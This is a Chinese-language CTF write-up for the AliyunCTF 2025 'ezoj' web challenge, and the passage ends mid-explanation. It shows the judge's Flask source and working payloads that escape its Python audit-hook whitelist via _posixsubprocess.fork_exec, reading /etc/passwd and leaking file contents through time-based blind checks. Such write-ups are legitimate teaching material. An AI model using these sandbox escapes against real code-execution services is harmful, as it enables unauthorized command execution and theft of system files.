---
layout: post
title: "阿里云CTF2025-Web"
date: 2025-03-08 21:21:17 +0800
description: "posixsubprocess.fork_exec 是 CPython 内部实现子进程的底层函数，属于 未暴露给标准审计事件 的底层调用。以为是命令啥的有错误, 但是本地试了一下命令是没问题的, 可以写入文件, 可能题目是没有权限写吧, 所以一直没成功。确实没有触发到RuntimeError , 可以执行命令 ,但是因为环境是无回显的, 无法看到执行的命令的结果。, 而常规的那些想要执行系统命令的函数都不在这几个白名单里面, 所以需要绕过。看完wp后发现还可以用通配符来着, 当时给忘了, 有点蠢了。"
keywords: "阿里云CTF2025 ---Web"
categories: ['未分类']
tags: ['Writeup', 'Web', 'Ctf']
artid: "145937780"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=145937780
    alt: "阿里云CTF2025-Web"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=145937780
featuredImagePreview: https://bing.ee123.net/img/rand?artid=145937780
cover: https://bing.ee123.net/img/rand?artid=145937780
image: https://bing.ee123.net/img/rand?artid=145937780
img: https://bing.ee123.net/img/rand?artid=145937780
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     阿里云CTF2025 ---Web
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h3>
     <a id="ezoj_0">
     </a>
     ezoj
    </h3>
    <blockquote>
     <p>
      啊？怎么整个五个算法题给CTF选手做？？这我不得不展示一下真正的技术把测评机打穿。
     </p>
    </blockquote>
    <p>
     可以看到源码
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> uuid
<span class="token keyword">import</span> json
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> send_file
<span class="token keyword">from</span> pathlib <span class="token keyword">import</span> Path

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

SUBMISSIONS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./submissions"</span><span class="token punctuation">)</span>
PROBLEMS_PATH <span class="token operator">=</span> Path<span class="token punctuation">(</span><span class="token string">"./problems"</span><span class="token punctuation">)</span>

SUBMISSIONS_PATH<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>parents<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

CODE_TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
import sys
import math
import collections
import queue
import heapq
import bisect

def audit_checker(event,args):
    if not event in ["import","time.sleep","builtins.input","builtins.input/result"]:
        raise RuntimeError

sys.addaudithook(audit_checker)

"""</span>

<span class="token keyword">class</span> <span class="token class-name">OJTimeLimitExceed</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">class</span> <span class="token class-name">OJRuntimeError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"static/index.html"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"server.py"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/problems"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">list_problems</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    problems_dir <span class="token operator">=</span> PROBLEMS_PATH
    problems <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> problem <span class="token keyword">in</span> problems_dir<span class="token punctuation">.</span>iterdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        problem_config_file <span class="token operator">=</span> problem <span class="token operator">/</span> <span class="token string">"problem.json"</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_config_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

        problem_config <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>problem_config_file<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        problem <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"problem_id"</span><span class="token punctuation">:</span> problem<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
            <span class="token string">"name"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string">"description"</span><span class="token punctuation">:</span> problem_config<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        problems<span class="token punctuation">.</span>append<span class="token punctuation">(</span>problem<span class="token punctuation">)</span>

    problems <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problems<span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token string">"problem_id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    problems <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"problems"</span><span class="token punctuation">:</span> problems<span class="token punctuation">}</span>
    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>problems<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/submit"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">submit_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
        code <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>
        problem_id <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"problem_id"</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> code <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> problem_id <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>
                jsonify<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Missing 'code' or 'problem_id'"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token number">400</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>

        problem_id <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>problem_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
        problem_dir <span class="token operator">=</span> PROBLEMS_PATH <span class="token operator">/</span> problem_id
        <span class="token keyword">if</span> <span class="token keyword">not</span> problem_dir<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>
                jsonify<span class="token punctuation">(</span>
                    <span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Problem ID </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>problem_id<span class="token punctuation">}</span></span><span class="token string"> not found!"</span></span><span class="token punctuation">}</span>
                <span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token number">404</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span>

        code_filename <span class="token operator">=</span> SUBMISSIONS_PATH <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"submission_</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">.py"</span></span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> code_file<span class="token punctuation">:</span>
            code <span class="token operator">=</span> CODE_TEMPLATE <span class="token operator">+</span> code
            code_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>

        result <span class="token operator">=</span> judge<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span>

        code_filename<span class="token punctuation">.</span>unlink<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>result<span class="token punctuation">)</span>

    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"ER"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> problem_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
    test_files <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>problem_dir<span class="token punctuation">.</span>glob<span class="token punctuation">(</span><span class="token string">"*.input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    total_tests <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_files<span class="token punctuation">)</span>
    passed_tests <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> test_file <span class="token keyword">in</span> test_files<span class="token punctuation">:</span>
            input_file <span class="token operator">=</span> test_file
            expected_output_file <span class="token operator">=</span> problem_dir <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>test_file<span class="token punctuation">.</span>stem<span class="token punctuation">}</span></span><span class="token string">.output"</span></span>

            <span class="token keyword">if</span> <span class="token keyword">not</span> expected_output_file<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

            case_passed <span class="token operator">=</span> run_code<span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span>

            <span class="token keyword">if</span> case_passed<span class="token punctuation">:</span>
                passed_tests <span class="token operator">+=</span> <span class="token number">1</span>

        <span class="token keyword">if</span> passed_tests <span class="token operator">==</span> total_tests<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"AC"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Accepted"</span></span><span class="token punctuation">}</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
                <span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"WA"</span><span class="token punctuation">,</span>
                <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Wrang Answer: pass(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>passed_tests<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>total_tests<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span>
    <span class="token keyword">except</span> OJRuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"RE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Runtime Error: ret=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">}</span>
    <span class="token keyword">except</span> OJTimeLimitExceed<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"TLE"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Time Limit Exceed"</span><span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">run_code</span><span class="token punctuation">(</span>code_filename<span class="token punctuation">,</span> input_file<span class="token punctuation">,</span> expected_output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> infile<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span>
        expected_output_file<span class="token punctuation">,</span> <span class="token string">"r"</span>
    <span class="token punctuation">)</span> <span class="token keyword">as</span> expected_output<span class="token punctuation">:</span>
        expected_output_content <span class="token operator">=</span> expected_output<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>
            <span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> code_filename<span class="token punctuation">]</span><span class="token punctuation">,</span>
            stdin<span class="token operator">=</span>infile<span class="token punctuation">,</span>
            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>
            text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>
            process<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">raise</span> OJTimeLimitExceed

        <span class="token keyword">if</span> process<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> OJRuntimeError<span class="token punctuation">(</span>process<span class="token punctuation">.</span>returncode<span class="token punctuation">)</span>

        <span class="token keyword">if</span> stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> expected_output_content<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     关键代码:
    </p>
    <pre><code class="prism language-php">def <span class="token function">audit_checker</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> not event in <span class="token punctuation">[</span><span class="token string double-quoted-string">"import"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"time.sleep"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"builtins.input"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"builtins.input/result"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        raise RuntimeError

sys<span class="token operator">.</span><span class="token function">addaudithook</span><span class="token punctuation">(</span>audit_checker<span class="token punctuation">)</span>
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/a215815e01584fb29a4315cf17c45a53.png"/>
    </p>
    <p>
     设置了白名单,只允许调用这几个事件
     <br/>
     而我们写入的python代码也会拼接到这下面去执行, 如果不在这几个白名单里面就会直接
     <code>
      raise RuntimeError
     </code>
     , 而常规的那些想要执行系统命令的函数都不在这几个白名单里面, 所以需要绕过
     <code>
      sys.addaudithook(audit_checker)
     </code>
     <br/>
     可以参照这篇文章
    </p>
    <blockquote>
     <p>
      <code>
       https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html
      </code>
     </p>
    </blockquote>
    <p>
     构造使用python的系统底层函数 _posixsubprocess 创建子进程进行命令执行
    </p>
    <blockquote>
     <p>
      _posixsubprocess.fork_exec 是 CPython 内部实现子进程的底层函数，属于 未暴露给标准审计事件 的底层调用。它直接通过系统调用（如 fork 和 execve）操作，绕过了高层抽象（如 subprocess 模块），因此不会触发类似 “subprocess.Popen” 的审计事件。
     </p>
    </blockquote>
    <p>
     构造的payload:
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> _posixsubprocess
_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     本地尝试运行一下
    </p>
    <pre><code class="prism language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> math
<span class="token keyword">import</span> collections
<span class="token keyword">import</span> queue
<span class="token keyword">import</span> heapq
<span class="token keyword">import</span> bisect

<span class="token keyword">def</span> <span class="token function">audit_checker</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>event<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>args<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> event <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"import"</span><span class="token punctuation">,</span><span class="token string">"time.sleep"</span><span class="token punctuation">,</span><span class="token string">"builtins.input"</span><span class="token punctuation">,</span><span class="token string">"builtins.input/result"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'Operation not permitted: {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span>

sys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>audit_checker<span class="token punctuation">)</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> _posixsubprocess

_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>

</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/20ca0f8854b94b5694fba1e93d5c67be.png"/>
    </p>
    <p>
     确实没有触发到RuntimeError , 可以执行命令 ,但是因为环境是无回显的, 无法看到执行的命令的结果
    </p>
    <p>
     刚开始第一个想法是想要将回显的结果写入到 /app/server.py 文件里面
     <br/>
     因为这个文件可以通过 /source 路由查看, 但是一直没成功
     <br/>
     以为是命令啥的有错误, 但是本地试了一下命令是没问题的, 可以写入文件, 可能题目是没有权限写吧, 所以一直没成功
    </p>
    <pre><code class="prism language-python">_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">b"/bin/ls / &gt; 1.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span>
<span class="token punctuation">)</span>
</code></pre>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/67f42e1ae5bd4f21a764ef5d750dd564.png"/>
    </p>
    <p>
     后面又想是不是可以尝试时间盲注
     <br/>
     就先让AI简单的写一下进行测试
    </p>
    <pre><code class="prism language-php">import _posixsubprocess
import os

<span class="token comment"># 泄露/etc/passwd第一个字符是否为'r'（ASCII 114）</span>
command <span class="token operator">=</span> b<span class="token string double-quoted-string">""</span><span class="token string double-quoted-string">"
if [ $(head -c1 /etc/passwd | od -An -t u1) -eq 114 ]; then
    sleep 5
fi
"</span><span class="token string double-quoted-string">""</span>
_posixsubprocess<span class="token operator">.</span><span class="token function">fork_exec</span><span class="token punctuation">(</span>
    <span class="token punctuation">[</span>b<span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"-c"</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span>b<span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token operator">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">False</span><span class="token punctuation">,</span> <span class="token constant boolean">False</span><span class="token punctuation">,</span> <span class="token constant boolean">False</span><span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> None<span class="token punctuation">,</span> <span class="token constant boolean">False</span>
<span class="token punctuation">)</span>
</code></pre>
    <p>
     可以发现程序超时了, 进过几次尝试可以发现确实存在一个时间盲注的问题
     <br/>
